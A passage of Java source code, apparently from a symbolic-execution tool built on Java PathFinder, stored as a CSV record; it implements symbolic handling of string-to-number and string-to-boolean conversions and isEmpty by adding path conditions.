id,title,username,language,date,content
			} else if (argTypes[0].equals(""chararray"")) {
				return handleCharArrayValueOf(invInst, th);
			} else if (argTypes[0].equals(""boolean"")) {
				return handleBooleanValueOf(invInst, th);
			} else if (argTypes[0].equals(""java.lang.Object"")) {
				return handleObjectValueOf(invInst, th);
			} else {
				throw new RuntimeException(""ERROR: Input parameter type not handled in Symbolic String ValueOf"");
			}
		} else { // value of non-string types
			if (cname.equals(""java.lang.Integer"")) {
				if (!(argTypes[0].equals(""int""))) { // converting String to Integer
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseIntValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseIntValueOf(invInst,  th);
				}
			} else if (cname.equals(""java.lang.Float"")) {
				if (!(argTypes[0].equals(""float""))) { // converting String to Float
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseFloatValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseFloatValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Long"")) {
				if (!(argTypes[0].equals(""long""))) { // converting String to Long
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseLongValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseLongValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Double"")) {
				if (!(argTypes[0].equals(""double""))) { // converting String to Double
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().getSystemState().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseDoubleValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseLongValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Boolean"")) {
				if (!(argTypes[0].equals(""boolean""))) { // converting String to Boolean
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseBooleanValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseBooleanValueOf(invInst, th);
				}
			} else {
				throw new RuntimeException(""ERROR: Type not handled in Symbolic Type ValueOf: "" + cname);
			}
		}
		return null;
	}
	public void handleIsEmpty(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleIsEmpty"");
		} else {
			IntegerExpression sym_v2 = sym_v1._length();
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			sf.pop();
			PathCondition pc;

			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null) {
				pc = new PathCondition();
			} else {
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();
			}

			assert pc != null;

			if(conditionValue){
				pc._addDet(Comparator.EQ, sym_v2, (IntegerExpression)(new IntegerConstant(0)));
				if(!pc.simplify()) {
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}else{
				pc._addDet(Comparator.NE, sym_v2, (IntegerExpression)(new IntegerConstant(0)));
				if(!pc.simplify()) {
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}

			sf.push(conditionValue ? 1 : 0, true);
		}
	}

	public void handleParseLongValueOf(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.popLong();
				int objRef = getNewObjRef(invInst, th); /* dummy Long Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISLONG, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Long Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTLONG, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Long Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true); TODO: needs revision
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseBooleanValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				int objRef = getNewObjRef(invInst, th); /* dummy Boolean Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISBOOLEAN, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Boolean Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTBOOLEAN, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Boolean Format Type Exception""); 
						// TODO: to review; there should be no backtracking here
						//th.getVM().getSystemState().setIgnored(true);
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseIntValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				int objRef = getNewObjRef(invInst, th); /* dummy Integer Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISINTEGER, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Integer Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTINTEGER, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Integer Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseInt(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			IntegerExpression result = null;
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			sf.pop();
			PathCondition pc;
			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null)
				pc = new PathCondition();
			else
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

			assert pc != null;

			if (conditionValue) {
				pc.spc._addDet(StringComparator.ISINTEGER, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					result = ((StringExpression) sym_v3)._IvalueOf();
					sf.push(0, false); /* Result is don't care and an int */
					sf = th.getModifiableTopFrame();
					sf.setOperandAttr(result);
				}
			} else {
				pc.spc._addDet(StringComparator.NOTINTEGER, (StringExpression) sym_v3);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					th.createAndThrowException(""java.lang.NumberFormatException"");
//					throw new RuntimeException(""ERROR: Integer Format Type Exception"");
//					//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
//					//sf.push(0, true);
				}
			}
		}

	}

	public void handleParseFloat(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			RealExpression result = null;
			ChoiceGenerator<?> cg;
			boolean conditionValue;
